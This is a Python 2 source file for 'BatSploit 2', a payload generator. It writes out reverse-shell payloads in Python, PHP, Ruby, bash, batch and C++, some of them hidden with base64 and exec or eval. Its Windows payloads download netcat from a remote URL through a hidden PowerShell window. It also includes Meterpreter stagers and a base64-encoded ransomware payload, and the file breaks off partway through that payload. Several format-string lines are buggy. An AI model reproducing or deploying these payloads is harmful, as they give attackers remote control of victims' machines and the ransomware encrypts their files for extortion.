#-*-coding: utf8-*-
'''
@Author : Daniel Victor Freire Feitosa
@Version : 2.0
@Name : BatSploit
@Language : Python 2.7

<danielfreire56@hotmail.com>

Tool Open-Source, qualquer mudança pra melhor é bem vinda, os textos estão em inglês pq é mais simples não ter
que acentuar tudo, e também é uma língua universal, mas os comentários estão em pt-br 
'''
import os, sys, platform
try:
	from colorama import init
	from termcolor import colored
	init()
	if platform.system() == "Windows" and os.path.exists("cpp/bin") == False:
		sys.stdout.write("[!] Some modules needed to use BatSploit 2\n[*] Run : setup.py\n")
		sys.exit()
except ImportError:
	sys.stdout.write("[!] Some modules needed to use BatSploit 2\n[*] Run : setup.py\n")
	sys.exit()

class BatSploit(object):

	def __init__(self, name, version, platform):
		self.platform = platform
		self.name = name
		self.version = version
	
	def banner(self):
		if self.platform == "Windows":
			os.system("cls") # if windows
		else:
			os.system("clear") # if linux or mac
		print ""
		print colored("# cosway ...", "green")
		print colored(" _____________", "white")
		print colored("<", "white") + colored(" BatSploit 2 ", "green") + colored(">", "white")
		print colored(" -------------", "white")
		print colored("       \   ,__,", "white")
		print colored("        \  (oo)____", "white")
		print colored("           (__)    )\\", "white")
		print colored("              ||--|| *", "white")
		sys.stdout.write(colored("\n @Author : Daniel Victor Freire\n", "grey"))
		sys.stdout.write(colored(" @Version : 2.0.0\n", "grey"))
		sys.stdout.write(colored(" <danielfreire56@hotmail.com>\n", "grey"))

	def usage(self, argv):
		name_script = argv.split("\\") # windows only
		try:
			index_name = len(name_script) - 1 
			name = name_script[index_name] # nome do script no windows
		except IndexError:
			name = argv
		sys.stdout.write(colored("\n ======", "green"))
		sys.stdout.write(colored(" Usage of tool ", "white"))
		sys.stdout.write(colored("======\n", "green"))
		sys.stdout.write(colored("\n[+] "+name, "green"))
		sys.stdout.write(colored(" -list : List all payloads\n", "white"))
		sys.stdout.write(colored("[+] "+name, "green"))
		sys.stdout.write(colored(" -bind : Start handler to audit payloads\n", "white"))
		sys.stdout.write(colored("[+] "+name, "green"))
		sys.stdout.write(colored(" -nc_bind : Start handler to audit payloads with netcat\n", "white"))
		sys.stdout.write(colored("[+] "+name, "green"))
		sys.stdout.write(colored(" -payload : Create payloads\n", "white"))

	def usage_bind(self, argv):
		name_script = argv.split("\\") # windows only
		try:
			index_name = len(name_script) - 1 
			name = name_script[index_name] # nome do script no windows
		except IndexError:
			name = argv
		sys.stdout.write(colored("\n ======", "green"))
		sys.stdout.write(colored(" Usage to start handler ", "white"))
		sys.stdout.write(colored("======\n", "green"))
		sys.stdout.write(colored("\n[+] "+name, "green"))
		sys.stdout.write(colored(" -bind LHOST=127.0.0.1 LPORT=1337\n", "white"))

	def usage_nc_bind(self, argv):
		name_script = argv.split("\\") # windows only
		try:
			index_name = len(name_script) - 1 
			name = name_script[index_name] # nome do script no windows
		except IndexError:
			name = argv
		sys.stdout.write(colored("\n ======", "green"))
		sys.stdout.write(colored(" Usage to start handler ", "white"))
		sys.stdout.write(colored("======\n", "green"))
		sys.stdout.write(colored("\n[+] "+name, "green"))
		sys.stdout.write(colored(" -nc_bind LHOST=127.0.0.1 LPORT=1337\n", "white"))

	def usage_payload(self, argv):
		name_script = argv.split("\\") # windows only
		try:
			index_name = len(name_script) - 1 
			name = name_script[index_name] # nome do script no windows
		except IndexError:
			name = argv
		sys.stdout.write(colored("\n ======", "green"))
		sys.stdout.write(colored(" Usage to start handler ", "white"))
		sys.stdout.write(colored("======\n", "green"))
		sys.stdout.write(colored("\n[+] "+name, "green"))
		sys.stdout.write(colored(" -payload python/batsploit/reverse_tcp LHOST=127.0.0.1 LPORT=1337 payload.py\n", "white"))

	def usage_payload_ransomware(self, argv):
		name_script = argv.split("\\") # windows only
		try:
			index_name = len(name_script) - 1 
			name = name_script[index_name] # nome do script no windows
		except IndexError:
			name = argv
		sys.stdout.write(colored("\n ======", "green"))
		sys.stdout.write(colored(" Usage to start handler ", "white"))
		sys.stdout.write(colored("======\n", "green"))
		sys.stdout.write(colored("\n[+] "+name, "green"))
		sys.stdout.write(colored(" -payload python/ransomware ransomware.py\n", "white"))

	def list_payloads(self):
		# essa função lista os payloads
		print "\n[!] Payloads List"
		if self.platform == "Windows":
			payloads = ['python/netcat/reverse_tcp', 'python/batsploit/reverse_tcp', 'python/meterpreter/reverse_tcp', 'python/ransomware', 'windows/netcat/reverse_tcp', 'windows/c++/powershell_reverse_tcp', 'windows/c++/socket_reverse_tcp', 'linux/netcat/reverse_tcp', 'php/socket/reverse_tcp', 'php/netcat/reverse_tcp', 'php/meterpreter/reverse_tcp', 'ruby/netcat/reverse_tcp'] # tupple contendo os payloads
		else:
			payloads = ['python/netcat/reverse_tcp', 'python/batsploit/reverse_tcp', 'python/meterpreter/reverse_tcp', 'python/ransomware', 'windows/netcat/reverse_tcp', 'linux/netcat/reverse_tcp', 'php/socket/reverse_tcp', 'php/netcat/reverse_tcp', 'php/meterpreter/reverse_tcp', 'ruby/netcat/reverse_tcp'] # tupple contendo os payloads
		for payload in payloads:
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored(payload, "white"))
		print ""

	def bind(self, lhost, lport):
		if not lhost:
			sys.stdout.write(colored("\n[-] ", "red"))
			sys.stdout.write(colored("Set example : LHOST=127.0.0.1\n", "white"))
		elif not lport:
			sys.stdout.write(colored("\n[-] ", "red"))
			sys.stdout.write(colored("Set example : LPORT=1337\n", "white"))
		host = lhost.split("=")[1] # local host para escutar a conexão
		port = lport.split("=")[1] # local port para escutar a conexão
		sys.stdout.write(colored("\n ======", "green"))
		sys.stdout.write(colored(" Handler started at {host}:{port}".format(host=host, port=int(port)), "white"))
		sys.stdout.write(colored("======\n", "green"))
		if self.platform == "Windows":
			os.system("start python handler.py %s %s".format(host=host, port=int(port)))
		elif self.platform == "Linux":
			os.system("gnome-terminal python handler.py {host} {port}".format(host=host, port=int(port)))

	def nc_bind(self, lhost, lport):
		# isso escuta as conecxoes com netcat
		host = lhost.split("=")[1]
		port = lport.split("=")[1]
		sys.stdout.write(colored("\n ======", "green"))
		sys.stdout.write(colored(" Handler started at {host}:{port}".format(host=host, port=int(port)), "white"))
		sys.stdout.write(colored("======\n", "green"))
		if self.platform == "Windows":
			os.system("start nc.exe -nvlp {port}".format(port))
		elif self.platform == "Linux":
			os.system("gnome-terminal nc -nvlp {port}".format(port))

	def compilers_verify(self):
		# verifica se os compiladores de c++ existem
		if self.platform == "Windows":
			path_compilers = "cpp/bin" # path dos compiladores
			path_compilers_include = "cpp/include" # path dos arquivos para os compiladores
			path_compilers_sys = "cpp/include/sys" # path dos arquivos para os compiladores
			if os.path.exists(path_compilers) == False or os.path.exists(path_compilers_include) == False or os.path.exists(path_compilers_sys) == False:
				sys.stdout.write(colored("\n[!] ", "red"))
				sys.stdout.write(colored(" Some compilers are needed to create this payload, run setup.py\n", "white"))
				sys.exit()
			else:
				return True
		elif self.platform == "Linux":
			verify_cmd = os.popen("i586-mingw32msvc-gcc --version")
			if "Copyright" in verify_cmd.read():
				return True
			else:
				sys.stdout.write(colored("\n[!] ", "red"))
				sys.stdout.write(colored(" Some compilers are needed to create this payload, run setup.py\n", "white"))
				sys.stdout.write(colored("\n[!] ", "yellow"))
				sys.stdout.write(colored(" This part of script doesn't optimized to linux distros :(\n", "red"))
				sys.exit()

	def create_payload(self, payload, lhost, lport, name):
		host = lhost.split("=")[1] # local host para o payload se conectar
		port = int(lport.split("=")[1]) # local port para o payload se conectar
		sys.stdout.write(colored("\n ======", "green"))
		sys.stdout.write(colored(" Creating Payload : %s ".format(payload), "white"))
		sys.stdout.write(colored("======\n", "green"))
		if payload == 'python/netcat/reverse_tcp':
			# code ...
			code = "import socket,os\n"
			code += "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
			code += "s.connect(('%s', %i))\n".format(host=host, port=int(port))
			code += "while True:\n"
			code += "	s.send(os.popen(s.recv(1024)).read())"
			encode = code.encode('base64').replace("\n", "") # isso codifica o código
			payload_coded = "string = '%s'\n".format(encode)
			payload_coded += "exec(string.decode('base64'))" # isso decodifica e executa o payload
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(payload_coded) # escreve o código no arquivo
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s ".format(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "%s" "compiled/%s" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
		elif payload == 'python/batsploit/reverse_tcp':
			# code
			code = "import socket, os\n"
			code += "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
			code += "s.connect(('%s', %i))\n".format(host=host, port=int(port))
			code += "s.send('[~] Garanted Access by BatSploit 2.0 [~]')\n"
			code += "while True:\n"
			code += "	saida_cmd = os.popen(s.recv(1024)).read()\n"
			code += "	if len(saida_cmd) == 0:\n"
			code += "		saida_cmd = '[+] Executed !'\n"
			code += "	s.send(saida_cmd)"
			encode = code.encode('base64').replace("\n", "") # isso codifica o código
			payload_coded = "string = '%s'\n".format(encode)
			payload_coded += "exec(string.decode('base64'))" # isso decodifica e executa o payload
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(payload_coded) # escreve o código no arquivo
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s ".format(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "%s" "compiled/%s" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
		elif payload == 'windows/netcat/reverse_tcp':
			# code 
			code = "@echo off\n"
			code += "color 7f && mode 20, 10\n"
			code += "cd %TEMP%\n"
			code += "echo powershell -ExecutionPolicy bypass (New-Object System.Net.WebClient).DownloadFile('http://github.com/proxyanon/BatSploit/raw/master/nc.exe', 'nc.exe') > bd.bat\n"
			code += "echo nc.exe {host} {port} -e cmd >> bd.bat\n".format(host=host, port=int(port))
			code += "powershell -W hidden ./bd.bat"
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(code) # escreve o código no arquivo
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s ".format(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "%s" "compiled/%s" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
		elif payload == 'linux/netcat/reverse_tcp':
			# code
			code = "#!/bin/bash\n"
			code += "nc %s %i -e /bin/bash &> dismown && clear".format(host=host, port=int(port))
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(code) # escreve o código no arquivo
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s ".format(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "{name}" "compiled/{name}" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
		elif payload == 'php/socket/reverse_tcp':
			# code 
			code = "<?php\n"
			code += "$s = socket_create(AF_INET, SOCK_STREAM, 0);\n"
			code += "$con = socket_connect($s, '{host}', {port));\n".format(host=host, port=int(port))
			code += "while(1==1):\n"
			code += "	socket_write($s, fread(popen(socket_read($s, 1024), 'r'), 10024));\n"
			code += "endwhile;\n"
			code += "?>"
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(code) # escreve o código no arquivo
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s ".format(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "{name}" "compiled/{name}" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
		elif payload == 'python/meterpreter/reverse_tcp':
			# code ...
			code = "import socket,struct\n"
			code += "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
			code += "s.connect(('{host}', {port}))\n".format(host=host, port=int(port))
			code += "packet=struct.unpack('>I',s.recv(4))[0]\n"
			code += "data=s.recv(packet)\n"
			code += "while len(data)<packet:\n"
			code += "	data+=s.recv(packet-len(data))\n"
			code += "exec(data,{'s':s})"
			encode = code.encode('base64').replace("\n", "") # isso codifica o código
			payload_coded = "exec('%s'.decode('base64'))".format(encode) # isso decodifica e executa o payload
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(payload_coded) # escreve o código no arquivo
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s ".format(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "%s" "compiled/%s" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
		elif payload == 'php/netcat/reverse_tcp':
			# code ...
			code = "$s=fsockopen('%s',%i);while($s): fwrite($s, fread(popen(fread($s, 1024), 'r'), 20000)); endwhile;".format(host=host, port=int(port))
			encode = code.encode('base64').replace("\n", "")
			payload_coded = "<?php $string=base64_decode('%s');\n".format(encode)
			payload_coded += "eval($string);?>"
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(payload_coded)
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s ".format(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "{name}" "compiled/{name}" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
		elif payload == 'ruby/netcat/reverse_tcp':
			# code ...
			code = "require 'socket'\n"
			code += "s=TCPSocket.open('{host}', {port})\n".format(host=host, port=int(port))
			code += "while msg = s.gets\n"
			code += "	IO.popen(msg, 'r') do |pipe|\n"
			code += "		s.puts pipe.gets\n"
			code += "	end\n"
			code += "end\n"
			code += "s.close"
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(code) # escreve o código no arquivo
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s ".format(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "%s" "compiled/%s" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
		elif payload == "php/meterpreter/reverse_tcp":
			# code ...
			code = "$host = '{}';\n".format(host)
			code += "$port = {};\n".format(port)
			code += "$s = fsockopen($host, $port);\n"
			code += "$s_type = 'stream';\n"
			code += "$len = fread($s, 4);\n"
			code += '$a = unpack("Nlen", $len);'
			code += "\n$len = $a['len'];\n"
			code += "$b = '';\n"
			code += "while(strlen($b) < $len){\n"
			code += "	switch($s_type){\n"
			code += "		case 'stream': $b .= fread($s, $len-strlen($b)); break;\n"
			code += "	}\n"
			code += "}\n"
			code += "$GLOBALS['msgsock'] = $s;\n"
			code += "$GLOBALS['msgsock_type'] = $s_type;\n"
			code += "eval($b);\n"
			code += "die();"
			encode = code.encode('base64').replace("\n", "");
			payload_coded = "<?php\n"
			payload_coded += "$string=base64_decode('%s');\n".format(encode)
			payload_coded += "eval($string);\n"
			payload_coded += "?>"
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(payload_coded)
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s ".format(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "%s" "compiled/%s" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
		elif payload == 'windows/c++/powershell_reverse_tcp':
			# code ...
			verify = self.compilers_verify()
			if verify == True:
				url = "'https://github.com/proxyanon/BatSploit/raw/master/nc.exe'"
				url_save = "'netcat.exe'"
				code = "#include <iostream>\n"
				code += "#include <stdio.h>\n"
				code += "#include <stdlib.h>\n\n"
				code += "int main()\n"
				code += '{\n	system("@echo off && mode 20, 10 && color 7f");\n'
				code += 'system("echo  powershell (New-Object System.Net.WebClient).DownloadFile('+url+','+url_save+') > %temp%/bd.bat");'
				code += '\n	system("echo netcat '+host+' '+str(port)+' -e cmd >> %temp%/bd.bat");\n'
				code += '	system("cd %temp% && powershell -W hidden ./bd.bat");\n'
				code += '	return 0;\n'
				code += "}"
				payload_file = open(name, 'w') # abri o arquivo dst
				payload_file.write(code) # escreve o código no arquivo
				payload_file.close() # fecha o arquivo
				name_payload = name.split('.')[0]
				ext_payload = name.split('.')[0]
				new_name = name_payload + ".exe"
				sys.stdout.write(colored("\n[+] ", "green"))
				sys.stdout.write(colored("Payload was created ! \n", "white"))
				sys.stdout.write(colored("\n[+] ", "green"))
				sys.stdout.write(colored("LHOST : %s".format(host), "white"))
				sys.stdout.write(colored("\n[+] ", "green"))
				sys.stdout.write(colored("LPORT : %i".format(port), "white"))
				sys.stdout.write(colored("\n[+] ", "green"))
				sys.stdout.write(colored("Name : %s ".format(name), "white"))
				sys.stdout.write(colored("\n[+] ", "yellow"))
				sys.stdout.write(colored("Compiling ...", "white"))
				if self.platform == "Windows":
					bin_ = os.path.abspath('cpp\\bin\\mingw32-c++.exe') # path do compilador de C
					os.system('@echo off && cd cpp/bin && "%s" -static-libgcc -static-libstdc++ ../../%s -o ../../compiled/%s && cd ../../ && del %s'.format(bin_,name,new_name,name)) # compila para qualquer windows rodar					
					size_payload = os.path.getsize("compiled/"+new_name) / 1048576 # tamanho do payload
					sys.stdout.write(colored("\n[+] ", "green"))
					sys.stdout.write(colored("Size : %i mb ".format(size_payload), "white"))
					sys.stdout.write(colored("\n[+] ", "green"))
					sys.stdout.write(colored("Path : compiled/%s\n".format(new_name), "white"))
				elif self.platform == "Linux":
					os.system("i586-mingw32msvc-gcc %s -o %s".format(name,new_name))
		elif payload == 'windows/c++/socket_reverse_tcp':
			# code ...
			verify = self.compilers_verify()
			if verify == True:
				code = "I2luY2x1ZGUgPGlvc3RyZWFtPg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8d2luc29jay5oPg0KI2luY2x1ZGUgPGNvbmlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8d2luZG93cy5oPg0KDQpXU0FEQVRBIGRhdGE7DQpTT0NLRVQgczsNClNPQ0tBRERSX0lOIHNvY2s7DQpjaGFyIGJ1ZmZbMTAyNF07DQppbnQgYnl0ZXMsIHZlcjsNCg0KaW50IG1haW4oKQ0Kew0KCXN5c3RlbSgicG93ZXJzaGVsbCAtVyBoaWRkZW4gZWNobyAwIik7DQoJRklMRSAqY21kOw0KCWNoYXIgYnVmZmVyWzUxMl07DQoJV1NBU3RhcnR1cChNQUtFV09SRCgxLDEpLCAmZGF0YSk7DQoJcyA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgMCk7DQoJc29jay5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCglzb2NrLnNpbl9wb3J0ID0gaHRvbnMoTUVQKTsNCglzb2NrLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcigiTUVIIik7DQoJY29ubmVjdChzLCAoU09DS0FERFIqKSZzb2NrLCBzaXplb2Yoc29jaykpOw0KCXZlciA9IDE7DQoJd2hpbGUodmVyID09IDEpDQoJew0KCQlTbGVlcCgxKTsNCgkJbWVtc2V0KGJ1ZmYsMCwxMDI0KTsNCgkJYnl0ZXMgPSByZWN2KHMsIGJ1ZmYsIDEwMjQsIDApOw0KCQljbWQgPSBwb3BlbihidWZmLCAiciIpOw0KCQlpZihieXRlcyA9PSAtMSkNCgkJew0KCQkJZXhpdCgwKTsNCgkJfQ0KCQl3aGlsZShmZ2V0cyhidWZmZXIsIHNpemVvZihidWZmZXIpLCBjbWQpKQ0KCQl7DQoJCQlzZW5kKHMsIGJ1ZmZlciwgc3RybGVuKGJ1ZmZlciksIDApOw0KCQl9DQoJfQ0KCWdldGNoKCk7DQoJY2xvc2Vzb2NrZXQocyk7DQoJV1NBQ2xlYW51cCgpOw0KCXJldHVybiAwOw0KfQ=="
				decoded = code.decode('base64')
				payload_coded = decoded.replace("MEP", str(port)).replace("MEH", host)
				payload_file = open(name, 'w') # abri o arquivo dst
				payload_file.write(payload_coded)
				payload_file.close() # fecha o arquivo
				name_payload = name.split('.')[0]
				ext_payload = name.split('.')[0]
				new_name = name_payload + ".exe"
				sys.stdout.write(colored("\n[+] ", "green"))
				sys.stdout.write(colored("Payload was created ! \n", "white"))
				sys.stdout.write(colored("\n[+] ", "green"))
				sys.stdout.write(colored("LHOST : %s".format(host), "white"))
				sys.stdout.write(colored("\n[+] ", "green"))
				sys.stdout.write(colored("LPORT : %i".format(port), "white"))
				sys.stdout.write(colored("\n[+] ", "green"))
				sys.stdout.write(colored("Name : %s ".format(name), "white"))
				sys.stdout.write(colored("\n[+] ", "yellow"))
				sys.stdout.write(colored("Compiling ...", "white"))
				if self.platform == "Windows":
					bin_ = os.path.abspath('cpp\\bin\\mingw32-c++.exe') # path do compilador de C
					os.system('@echo off && cd cpp/bin && "%s" -static-libgcc -static-libstdc++ ../../%s -o ../../compiled/%s -lws2_32 && cd ../../ && del %s'.format(bin_,name,new_name,name)) # compila para qualquer windows rodar					
					size_payload = os.path.getsize("compiled/"+new_name) / 1048576 # tamanho do payload
					sys.stdout.write(colored("\n[+] ", "green"))
					sys.stdout.write(colored("Size : %i mb ".format(size_payload), "white"))
					sys.stdout.write(colored("\n[+] ", "green"))
					sys.stdout.write(colored("Path : compiled/%s\n".format(new_name), "white"))
				elif self.platform == "Linux":
					os.system("i586-mingw32msvc-gcc %s -o %s".format(name,new_name))
		elif payload == 'python/ransomware':
			# code ...
			code = "Iy0qLWNvZGluZzogdXRmLTgtKi0NCmltcG9ydCBvcywgaGFzaGxpYiwgc3lzLCBwbGF0Zm9ybSwgdGltZQ0KDQp0cnk6DQogICAgICAgIGlmIHBsYXRmb3JtLnN5c3RlbSgpID09ICJXaW5kb3dzIjoNCiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oImNscyIpICMgbGltcGEgYSB0ZWxhIHNlIGZvciB3aW5kb3dzDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgIyEvdXNyL2Jpbi9weXRob24NCiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikgIyBsaW1wYSBhIHRlbGEgc2UgZm9yIGxpbnV4DQogICAgICAgIHByaW50ICJcblsrXSBCYXRTcGxvaXQgUmFuc29td2FyZSBcbiINCiAgICAgICAgcHJpbnQgIiBAQXV0aG9yIDogUHJvWHkgU2VjIg0KICAgICAgICBwcmludCAiIEBWZXJzaW9uIDogMi4wLjAiDQogICAgICAgIHByaW50ICIgPGdpdGh1Yi5jb20vcHJveHlhbm9uLz5cbiIgIyBiYW5uZXINCiAgICAgICAgaWYgbGVuKHN5cy5hcmd2KSA+PSAyOg0KICAgICAgICAgICAgICAgIHBhdGhfdG9fZW5jcnlwdCA9IHN5cy5hcmd2WzFdICMgcGFzdGEgcGFyYSBzZXIgY3JpcHRvZ3JhZmFkYQ0KICAgICAgICAgICAgICAgIHByaW50ICIgPT09PT09PT09PT09PT09IFI0bnMwbXc0cjMgc3RhcnRlZCA9PT09PT09PT09PT09PT1cbiINCiAgICAgICAgICAgICAgICBmb3IgcGF0aHMsZGlycyxmaWxlcyBpbiBvcy53YWxrKHBhdGhfdG9fZW5jcnlwdCk6DQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGxhdGZvcm0uc3lzdGVtKCkgPT0gIldpbmRvd3MiOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAJZmxhZyA9IHBhdGhzKyJcXCIrZmlsZSAjIGxpc3RhIHRvZG9zIG9zIGF